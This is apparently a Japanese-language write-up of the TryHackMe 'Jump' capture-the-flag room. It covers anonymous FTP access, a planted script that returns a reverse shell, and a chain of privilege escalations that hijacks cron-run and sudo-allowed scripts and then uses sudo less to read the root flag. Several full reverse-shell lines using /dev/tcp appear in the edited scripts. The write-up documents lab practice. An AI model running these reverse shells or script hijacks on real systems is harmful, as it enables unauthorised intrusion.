# Jump CTF

https://tryhackme.com/room/jump

## Enumeration

```shell
TARGET=10.145.184.117
sudo bash -c "echo $TARGET   jump.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
```

```sh
sudo nmap -sV -p21,22 $TARGET

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP

anonymousでダウンロード。

```sh
$ wget -r --user="anonymous" --password="" ftp://$TARGET/
$ tree
.
└── 10.145.184.117
    ├── incoming
    └── pub
        ├── archive
        ├── README.txt
        └── uploads

6 directories, 1 file
```

incoming にシェルスクリプトを置いたら実行されてリバースシェル取得成功。

```sh
$ nc -nlvp 8888      
listening on [any] 8888 ...
connect to [192.168.131.34] from (UNKNOWN) [10.145.184.117] 46456
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xtermrecon_user@tryhackme-2404:~$ 
export TERM=xterm
recon_user@tryhackme-2404:~$ 
```

dev_user のフラグは読める設定になっている。

```sh
recon_user@tryhackme-2404:~$ id
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)

recon_user@tryhackme-2404:~$ ls -al /home
total 28
drwxr-xr-x  7 root         root         4096 Apr 29 10:46 .
drwxr-xr-x 22 root         root         4096 Jul  9 04:28 ..
drwxr-x---  3 dev_user     dev_user     4096 Jun  9 09:04 dev_user
drwxr-x---  2 monitor_user monitor_user 4096 Apr 26 19:41 monitor_user
drwxr-x---  2 ops_user     ops_user     4096 Apr 26 19:39 ops_user
drwxr-x---  3 recon_user   recon_user   4096 Jun  9 08:09 recon_user
drwxr-xr-x  5 ubuntu       ubuntu       4096 Jun 21 09:50 ubuntu

recon_user@tryhackme-2404:~$ ls -al /home/dev_user
total 32
drwxr-x--- 3 dev_user dev_user 4096 Jun  9 09:04 .
drwxr-xr-x 7 root     root     4096 Apr 29 10:46 ..
-rw-r--r-- 1 dev_user dev_user  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 dev_user dev_user 3877 Apr 26 19:22 .bashrc
drwxrwxr-x 3 dev_user dev_user 4096 Jun  9 09:04 .local
-rw-r--r-- 1 dev_user dev_user  807 Feb 25  2020 .profile
-rw-rw-r-- 1 dev_user dev_user   66 Jun  9 09:04 .selected_editor
-rw-r--r-- 1 dev_user dev_user   42 Apr 26 19:39 flag.txt
```

## 権限昇格１

monitor_user を目指す。

```sh
recon_user@tryhackme-2404:~$ find / -user monitor_user -not -path "/proc/*" 2>/dev/null
/sys/fs/cgroup/system.slice/healthcheck.service/memory.pressure
/opt/app/data
/opt/app/deploy_helper.sh
/usr/local/bin/healthcheck
/home/monitor_user
/var/log/monitor.log
```

```sh
recon_user@tryhackme-2404:~$ ls -al /opt/app/deploy_helper.sh
-rwxr-xr-x 1 monitor_user monitor_user 90 Feb  2 14:59 /opt/app/deploy_helper.sh

recon_user@tryhackme-2404:~$ ls -al /usr/local/bin/healthcheck
-rwxr-xr-x 1 monitor_user monitor_user 98 Apr 29 10:35 /usr/local/bin/healthcheck

recon_user@tryhackme-2404:~$ cat /opt/app/deploy_helper.sh 
#!/bin/bash
echo "[+] Deploy helper running"
echo "[+] Syncing application files"
sleep 2

recon_user@tryhackme-2404:~$ cat /usr/local/bin/healthcheck
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

lsコマンドが失敗するログが出続けている。上記のスクリプトのログではないと思われる。

```sh
recon_user@tryhackme-2404:~$ tail /var/log/monitor.log
ls: cannot access '/home/dev_user/bin': Permission denied
ls: cannot access '/home/dev_user/bin': Permission denied
ls: cannot access '/home/dev_user/bin': Permission denied
ls: cannot access '/home/dev_user/bin': Permission denied
ls: cannot access '/home/dev_user/bin': Permission denied
ls: cannot access '/home/dev_user/bin': Permission denied
ls: cannot access '/home/dev_user/bin': Permission denied
ls: cannot access '/home/dev_user/bin': Permission denied
ls: cannot access '/home/dev_user/bin': Permission denied
ls: cannot access '/home/dev_user/bin': Permission denied
```

dev_user グループのファイルを検索

```sh
recon_user@tryhackme-2404:~$ find / -group dev_user -not -path "/proc/*" 2>/dev/null
/tmp/recon_backup.tgz
/opt/dev
/opt/dev/backup.sh
/opt/dev/bin
/opt/dev/bin/ps
/home/dev_user
/home/dev_user/flag.txt
/home/dev_user/.profile
/home/dev_user/.bashrc
/home/dev_user/.selected_editor
/home/dev_user/.local
/home/dev_user/.local/share
/home/dev_user/.bash_logout
```

```sh
recon_user@tryhackme-2404:~$ ls -al /opt/dev/backup.sh
-rwxrwxr-x 1 dev_user dev_user 60 Jun  9 09:03 /opt/dev/backup.sh

recon_user@tryhackme-2404:~$ cat /opt/dev/backup.sh
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

```sh
recon_user@tryhackme-2404:~$ ls -al /opt/dev/bin/ps
-rw-rw-r-- 1 dev_user dev_user 62 Apr 26 18:19 /opt/dev/bin/ps
recon_user@tryhackme-2404:~$ file /opt/dev/bin/ps
/opt/dev/bin/ps: Bourne-Again shell script, ASCII text executable
recon_user@tryhackme-2404:~$ cat /opt/dev/bin/ps
#!/bin/bash
setsid bash -i >& /dev/tcp/10.82.84.138/5557 0>&1
```

いろいろなスクリプトが絡み合っているのでpspyでプロセスを観察する。

```sh
2026/07/09 05:01:45 CMD: UID=1003  PID=2904   | 
2026/07/09 05:01:50 CMD: UID=1003  PID=2906   | 
2026/07/09 05:01:50 CMD: UID=1003  PID=2905   | /bin/bash /usr/local/bin/healthcheck 
2026/07/09 05:01:50 CMD: UID=1003  PID=2907   | sleep 5 
2026/07/09 05:01:53 CMD: UID=0     PID=2908   | ps -e -o pid,ppid,state,command 
2026/07/09 05:01:55 CMD: UID=1003  PID=2910   | 
2026/07/09 05:01:55 CMD: UID=1003  PID=2909   | /bin/bash /usr/local/bin/healthcheck 
2026/07/09 05:01:55 CMD: UID=1003  PID=2911   | /bin/bash /usr/local/bin/healthcheck 
2026/07/09 05:02:00 CMD: UID=1003  PID=2912   | /bin/bash /usr/local/bin/healthcheck 
2026/07/09 05:02:00 CMD: UID=1003  PID=2913   | /bin/bash /usr/local/bin/healthcheck 
2026/07/09 05:02:00 CMD: UID=1003  PID=2914   | /bin/bash /usr/local/bin/healthcheck 
2026/07/09 05:02:01 CMD: UID=0     PID=2916   | /usr/sbin/CRON -f -P 
2026/07/09 05:02:01 CMD: UID=0     PID=2915   | /usr/sbin/CRON -f -P 
2026/07/09 05:02:01 CMD: UID=1002  PID=2918   | 
2026/07/09 05:02:01 CMD: UID=0     PID=2917   | /usr/sbin/CRON -f -P 
2026/07/09 05:02:01 CMD: UID=1002  PID=2919   | /bin/bash /opt/dev/backup.sh 
2026/07/09 05:02:01 CMD: UID=1001  PID=2920   | /bin/sh -c /bin/bash /opt/recon/scan_uploads.sh 
2026/07/09 05:02:01 CMD: UID=1002  PID=2921   | tar -czf /tmp/recon_backup.tgz /home/recon_user 
2026/07/09 05:02:01 CMD: UID=1001  PID=2922   | /bin/bash /opt/recon/scan_uploads.sh 
2026/07/09 05:02:01 CMD: UID=1002  PID=2924   | /bin/sh -c gzip 
2026/07/09 05:02:01 CMD: UID=1001  PID=2923   | sleep 5 
2026/07/09 05:02:01 CMD: UID=1001  PID=2926   | /bin/bash /srv/ftp/incoming/rev.sh 
2026/07/09 05:02:01 CMD: UID=???   PID=2925   | ???
```

- /usr/local/bin/healthcheck は５秒ごとに実行されている。(1003=monitor_user)
- /opt/dev/backup.sh は１分毎に実行されている。(1002=dev_user)
- /opt/recon/scan_uploads.sh は １分ごとに起動されている。(1001=recon_user)

dev_user のリバースシェルを取得

```sh
recon_user@tryhackme-2404:~$ cat /opt/dev/backup.sh
#!/bin/bash
sh -i >& /dev/tcp/192.168.131.34/8889 0>&1
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

```sh
dev_user@tryhackme-2404:~$ id
uid=1002(dev_user) gid=1002(dev_user) groups=1002(dev_user),1005(devops)
```

## 権限昇格２

/opt/dev/bin/ps を書き換えた。

```sh
dev_user@tryhackme-2404:~$ cat /opt/dev/bin/ps
#!/bin/bash
setsid bash -i >& /dev/tcp/192.168.131.34/8890 0>&1

dev_user@tryhackme-2404:~$ chmod +x /opt/dev/bin/ps
```

monitor_user のリバースシェルを取得

```sh
$ nc -nlvp 8890      
listening on [any] 8890 ...
connect to [192.168.131.34] from (UNKNOWN) [10.145.184.117] 37730
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
monitor_user@tryhackme-2404:/$ id
id
uid=1003(monitor_user) gid=1003(monitor_user) groups=1003(monitor_user)
```

## 権限昇格３

ops_user のファイル。

```sh
monitor_user@tryhackme-2404:~$ find / -user ops_user -not -path "/proc/*" 2>/dev/null
<d / -user ops_user -not -path "/proc/*" 2>/dev/null
/opt/app
/usr/local/bin/deploy.sh
/home/ops_user
```

```sh
monitor_user@tryhackme-2404:~$ ls -al /opt/app
ls -al /opt/app
total 16
drwxr-xr-x 3 ops_user     ops_user     4096 Feb  2 15:09 .
drwxr-xr-x 5 root         root         4096 Feb  2 10:03 ..
drwxrwxr-x 2 monitor_user monitor_user 4096 Feb  2 15:09 data
-rwxr-xr-x 1 monitor_user monitor_user   90 Feb  2 14:59 deploy_helper.sh
```

```sh
monitor_user@tryhackme-2404:~$ ls -al /usr/local/bin/deploy.sh
ls -al /usr/local/bin/deploy.sh
-rwxr-xr-x 1 ops_user ops_user 55 Feb  2 10:12 /usr/local/bin/deploy.sh

monitor_user@tryhackme-2404:~$ cat /usr/local/bin/deploy.sh
cat /usr/local/bin/deploy.sh
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

```sh
monitor_user@tryhackme-2404:~$ cat /opt/app/deploy_helper.sh
cat /opt/app/deploy_helper.sh
#!/bin/bash
echo "[+] Deploy helper running"
echo "[+] Syncing application files"
sleep 2
```

書き換え

```sh
monitor_user@tryhackme-2404:~$ cat /opt/app/deploy_helper.sh 
#!/bin/bash
echo "[+] Deploy helper running"
echo "[+] Syncing application files"
sh -i >& /dev/tcp/192.168.131.34/8893 0>&1
sleep 2
```

待っていてもリバースシェルを取れなかった。sudoで実行できる。

```sh
monitor_user@tryhackme-2404:~$ sudo -l
Matching Defaults entries for monitor_user on tryhackme-2404:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=LESS

User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

ops_user のリバースシェル取得成功。less を root として実行可能。

```sh
ops_user@tryhackme-2404:/opt/app$ sudo -l
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=LESS

User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

less コマンドで root フラグを読めた。

```sh
ops_user@tryhackme-2404:~$ sudo less /root/flag.txt
```

## 振り返り

- いくつものシェルスクリプトが最初から見えていたので、何がどのユーザーのものなのか整理が難しかった。
- 内容自体は難しくなかったが、いつVMが落ちるか分からない点で焦ったので、セーブポイントとしてSSH接続できるユーザーが欲しかった。

## Tags

#tags:
